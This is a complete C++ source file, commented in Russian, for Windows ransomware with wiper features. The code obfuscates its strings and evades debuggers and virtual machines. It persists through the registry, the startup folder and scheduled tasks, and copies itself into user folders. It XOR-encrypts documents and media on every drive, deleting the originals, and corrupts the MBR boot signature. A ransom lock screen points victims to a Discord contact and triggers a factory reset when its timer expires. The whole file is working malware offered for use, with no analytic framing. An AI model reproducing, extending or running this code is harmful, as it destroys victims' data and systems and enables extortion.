// ===================== ОБФУСКАЦИЯ СТРОК (COMPILE-TIME XOR) =====================
#pragma once
#include <winsock2.h>      // ДО windows.h — иначе конфликт с winsock.h
#include <ws2tcpip.h>      // для inet_ntoa, sockaddr и т.п.
#include <windows.h>
#include <iphlpapi.h>      // для IP_ADAPTER_INFO и GetAdaptersInfo
#include <string>
#include <vector>
#include <thread>
#include <fstream>
#include <filesystem>
#include <tlhelp32.h>
#include <winreg.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <intrin.h>

// Линковка нужных библиотек
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

namespace obf {
    template<size_t N>
    struct XorString {
        char data[N];
        constexpr XorString(const char* str) : data{} {
            for (size_t i = 0; i < N; ++i)
                data[i] = str[i] ^ 0xAA; // ключ обфускации
        }
        const char* decrypt() const {
            static thread_local char buf[N];
            for (size_t i = 0; i < N; ++i)
                buf[i] = data[i] ^ 0xAA;
            buf[N-1] = '\0';
            return buf;
        }
    };
}

#define OBF(str) ([]{ constexpr obf::XorString<sizeof(str)> _s(str); return _s.decrypt(); }())

// ===================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====================
std::string GetErrorMessage(DWORD code) {
    LPSTR buf = nullptr;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, nullptr, code, 0, (LPSTR)&buf, 0, nullptr);
    std::string msg = buf ? buf : "Unknown error";
    LocalFree(buf);
    return msg;
}

bool IsElevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size))
            isElevated = elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return isElevated != FALSE;
}

// ===================== АНТИ-ОТЛАДКА =====================
void AntiDebug() {
    // IsDebuggerPresent
    if (IsDebuggerPresent()) ExitProcess(0);
    // CheckRemoteDebuggerPresent
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged) ExitProcess(0);
    // NtQueryInformationProcess (ProcessDebugPort)
    typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (ntdll) {
        auto NtQueryInfo = (pNtQueryInformationProcess)GetProcAddress(ntdll, OBF("NtQueryInformationProcess"));
        if (NtQueryInfo) {
            DWORD debugPort = 0;
            NTSTATUS status = NtQueryInfo(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), nullptr); // 7 = ProcessDebugPort
            if (status >= 0 && debugPort != 0) ExitProcess(0);
        }
    }
    // Тайминговая проверка
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(100);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    if (elapsed > 0.2) ExitProcess(0);
}

// ===================== АНТИ-ВИРТУАЛИЗАЦИЯ =====================
bool IsVirtualMachine() {
    // Проверка через CPUID (hypervisor bit)
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) return true;

    // Проверка производителя BIOS
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, OBF("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char biosVendor[256] = {0};
        DWORD size = sizeof(biosVendor);
        if (RegQueryValueExA(hKey, OBF("BIOSVersion"), nullptr, nullptr, (LPBYTE)biosVendor, &size) == ERROR_SUCCESS) {
            std::string vendor(biosVendor);
            for (auto& c : vendor) c = tolower(c);
            if (vendor.find("vmware") != std::string::npos ||
                vendor.find("virtualbox") != std::string::npos ||
                vendor.find("qemu") != std::string::npos ||
                vendor.find("xen") != std::string::npos ||
                vendor.find("parallels") != std::string::npos)
                return true;
        }
        RegCloseKey(hKey);
    }

    // Проверка MAC-адреса (диапазоны VMware/VBox)
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        while (adapter) {
            if (adapter->AddressLength >= 6) {
                BYTE* mac = adapter->Address;
                if ((mac[0] == 0x00 && mac[1] == 0x0C) || // VMware
                    (mac[0] == 0x00 && mac[1] == 0x50) || // VMware
                    (mac[0] == 0x08 && mac[1] == 0x00) || // VirtualBox
                    (mac[0] == 0x00 && mac[1] == 0x05) || // Xen
                    (mac[0] == 0x00 && mac[1] == 0x1C))  // VMware
                    return true;
            }
            adapter = adapter->Next;
        }
    }
    return false;
}

// ===================== СКРЫТИЕ ПРОЦЕССА =====================
void HideProcess() {
    // Скрыть окно консоли
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    // Пометить процесс как критический (система упадёт при завершении)
    typedef NTSTATUS(WINAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
    HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    if (ntdll) {
        auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, OBF("RtlSetProcessIsCritical"));
        if (RtlSetProcessIsCritical) {
            BOOLEAN breakOnTermination = FALSE;
            RtlSetProcessIsCritical(TRUE, &breakOnTermination, FALSE);
        }
    }
}

// ===================== ПЕРСИСТЕНТНОСТЬ =====================
void InstallPersistence() {
    // Реестр Run
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, OBF("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        CHAR exePath[MAX_PATH];
        GetModuleFileNameA(nullptr, exePath, MAX_PATH);
        RegSetValueExA(hKey, OBF("SystemProcess"), 0, REG_SZ, (BYTE*)exePath, lstrlenA(exePath) + 1);
        RegCloseKey(hKey);
    }
    // Папка автозагрузки
    CHAR startupPath[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath);
    std::string dest = std::string(startupPath) + OBF("\\system.exe");
    CHAR selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    CopyFileA(selfPath, dest.c_str(), FALSE);
    // Планировщик задач (скрытый запуск при входе)
    std::string cmd = std::string(OBF("schtasks /create /tn \"SystemMaintenance\" /tr \"")) + selfPath + OBF("\" /sc onlogon /rl highest /f");
    system(cmd.c_str());
}

// ===================== РАЗМНОЖЕНИЕ =====================
void Spread() {
    CHAR selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    std::vector<std::string> dirs = {
        std::string(getenv("TEMP")),
        std::string(getenv("APPDATA")),
        std::string(getenv("LOCALAPPDATA")),
        OBF("C:\\Users\\Public"),
        OBF("C:\\ProgramData")
    };
    for (const auto& dir : dirs) {
        if (GetFileAttributesA(dir.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        // Генерируем случайное имя
        char name[9] = {0};
        for (int i = 0; i < 8; ++i) name[i] = 'a' + rand() % 26;
        std::string target = dir + "\\" + name + ".exe";
        CopyFileA(selfPath, target.c_str(), FALSE);
        // Запускаем копию
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(target.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ===================== ШИФРОВАНИЕ ФАЙЛОВ =====================
void EncryptFile(const std::string& path) {
    // Простое XOR-шифрование с ключом, производным от пароля
    const std::string key = OBF("2099209920993000");
    std::ifstream in(path, std::ios::binary);
    if (!in) return;
    std::vector<char> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();
    for (size_t i = 0; i < data.size(); ++i)
        data[i] ^= key[i % key.size()];
    std::string newPath = path + OBF(".akronov");
    std::ofstream out(newPath, std::ios::binary);
    out.write(data.data(), data.size());
    out.close();
    DeleteFileA(path.c_str());
}

void ScanAndEncrypt() {
    // Получаем все логические диски
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; ++i) {
        if (!(drives & (1 << i))) continue;
        char root[4] = { char('A' + i), ':', '\\', '\0' };
        std::filesystem::recursive_directory_iterator it(root, std::filesystem::directory_options::skip_permission_denied), end;
        for (; it != end; ++it) {
            if (it->is_regular_file()) {
                std::string ext = it->path().extension().string();
                // Проверяем расширение
                if (ext == ".doc" || ext == ".docx" || ext == ".xls" || ext == ".xlsx" ||
                    ext == ".ppt" || ext == ".pptx" || ext == ".pdf" || ext == ".jpg" ||
                    ext == ".jpeg" || ext == ".png" || ext == ".gif" || ext == ".txt" ||
                    ext == ".zip" || ext == ".rar" || ext == ".7z" || ext == ".mp3" ||
                    ext == ".mp4" || ext == ".avi" || ext == ".mkv" || ext == ".db" ||
                    ext == ".sql" || ext == ".php" || ext == ".html" || ext == ".java" ||
                    ext == ".cpp" || ext == ".py") {
                    EncryptFile(it->path().string());
                }
            }
            // Ограничение глубины для производительности
            if (it.depth() > 10) it.disable_recursion_pending();
        }
    }
}

// ===================== MBR / BIOS =====================
void InfectMBR() {
    if (!IsElevated()) return;
    HANDLE disk = CreateFileA(OBF("\\\\.\\PhysicalDrive0"), GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (disk == INVALID_HANDLE_VALUE) return;
    BYTE mbr[512];
    DWORD read;
    SetFilePointer(disk, 0, nullptr, FILE_BEGIN);
    if (!ReadFile(disk, mbr, 512, &read, nullptr) || read != 512) {
        CloseHandle(disk);
        return;
    }
    // Обнуляем сигнатуру 55 AA
    SetFilePointer(disk, 510, nullptr, FILE_BEGIN);
    BYTE nullBytes[2] = {0, 0};
    DWORD written;
    WriteFile(disk, nullBytes, 2, &written, nullptr);
    CloseHandle(disk);
}

// ===================== ГРАФИЧЕСКИЙ ИНТЕРФЕЙС =====================
// Глобальные переменные для окна блокировки
HWND g_hwndLock = nullptr;
int g_remainingSeconds = 7200;
const int kPasswordSubtract = 3600;

LRESULT CALLBACK LockWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit, hButton, hTimerText;
    static HFONT hFont;
    switch (msg) {
    case WM_CREATE: {
        // Красный фон
        SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(139, 0, 0)));
        // Текст заголовка
        CreateWindowA("STATIC", OBF("Oops, your files are encrypted!"),
            WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 200, GetSystemMetrics(SM_CXSCREEN), 60, hwnd, nullptr, nullptr, nullptr);
        // Подсказка
        CreateWindowA("STATIC", OBF("To unlock, contact Discord: akronov"),
            WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 300, GetSystemMetrics(SM_CXSCREEN), 40, hwnd, nullptr, nullptr, nullptr);
        // Поле ввода пароля
        hEdit = CreateWindowA("EDIT", "",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_CENTER,
            GetSystemMetrics(SM_CXSCREEN) / 2 - 150, 400, 300, 30, hwnd, nullptr, nullptr, nullptr);
        // Кнопка разблокировки
        hButton = CreateWindowA("BUTTON", OBF("Unlock"),
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            GetSystemMetrics(SM_CXSCREEN) / 2 - 50, 450, 100, 40, hwnd, (HMENU)1, nullptr, nullptr);
        // Таймер
        hTimerText = CreateWindowA("STATIC", OBF("02:00:00"),
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            0, 500, GetSystemMetrics(SM_CXSCREEN), 80, hwnd, nullptr, nullptr, nullptr);
        // Большой шрифт
        hFont = CreateFontA(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, OBF("Arial"));
        SendMessageA(hTimerText, WM_SETFONT, (WPARAM)hFont, TRUE);
        SetTimer(hwnd, 1, 1000, nullptr);
        break;
    }
    case WM_TIMER: {
        if (--g_remainingSeconds <= 0) {
            // Время истекло: сброс к заводским
            KillTimer(hwnd, 1);
            system(OBF("systemreset -factoryreset"));
            system(OBF("shutdown /r /t 0 /f"));
            ExitProcess(0);
        }
        int hours = g_remainingSeconds / 3600;
        int minutes = (g_remainingSeconds % 3600) / 60;
        int seconds = g_remainingSeconds % 60;
        char buf[16];
        sprintf_s(buf, "%02d:%02d:%02d", hours, minutes, seconds);
        SetWindowTextA(hTimerText, buf);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == 1) { // кнопка Unlock
            char pass[100];
            GetWindowTextA(hEdit, pass, 100);
            if (strcmp(pass, OBF("2099209920993000")) == 0) {
                DestroyWindow(hwnd);
                PostQuitMessage(0);
            } else {
                g_remainingSeconds -= kPasswordSubtract;
                if (g_remainingSeconds < 0) g_remainingSeconds = 0;
                MessageBoxA(hwnd, OBF("Wrong password! -1 hour"), OBF("Error"), MB_ICONERROR);
            }
        }
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowLockScreen() {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = LockWndProc;
    wc.hInstance = GetModuleHandleA(nullptr);
    wc.lpszClassName = OBF("LockScreenClass");
    wc.hbrBackground = CreateSolidBrush(RGB(139, 0, 0));
    RegisterClassA(&wc);
    g_hwndLock = CreateWindowExA(WS_EX_TOPMOST, wc.lpszClassName, OBF("Locked"),
        WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(g_hwndLock, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_hwndLock);
    // Отключаем Alt+F4
    EnableMenuItem(GetSystemMenu(g_hwndLock, FALSE), SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
    MSG msg;
    while (GetMessageA(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
}

void ShowScarySmile() {
    // Окно со страшным смайликом на 2 секунды
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DefWindowProcA;
    wc.hInstance = GetModuleHandleA(nullptr);
    wc.lpszClassName = OBF("ScaryClass");
    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
    RegisterClassA(&wc);
    HWND hwnd = CreateWindowExA(0, wc.lpszClassName, OBF("Scary"),
        WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    // Рисуем смайлик (эмодзи) через GDI
    HDC hdc = GetDC(hwnd);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 0, 0));
    HFONT font = CreateFontA(200, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH, OBF("Segoe UI Emoji"));
    SelectObject(hdc, font);
    RECT rect;
    GetClientRect(hwnd, &rect);
    DrawTextA(hdc, OBF("\xF0\x9F\x98\x88"), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE); // 😈
    DeleteObject(font);
    ReleaseDC(hwnd, hdc);
    Sleep(2000);
    DestroyWindow(hwnd);
    UnregisterClassA(wc.lpszClassName, wc.hInstance);
}

// ===================== ОСНОВНАЯ ФУНКЦИЯ =====================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Инициализация
    srand((unsigned)time(nullptr));
    HideProcess();
    AntiDebug();
    if (IsVirtualMachine()) ExitProcess(0);

    // Установка персистентности и размножение
    InstallPersistence();
    Spread();

    // Запуск шифрования в фоне
    std::thread encryptThread(ScanAndEncrypt);
    encryptThread.detach();

    // Заражение MBR (если есть права)
    InfectMBR();

    // Показ страшного смайлика и экрана блокировки
    ShowScarySmile();
    ShowLockScreen();

    return 0;
}
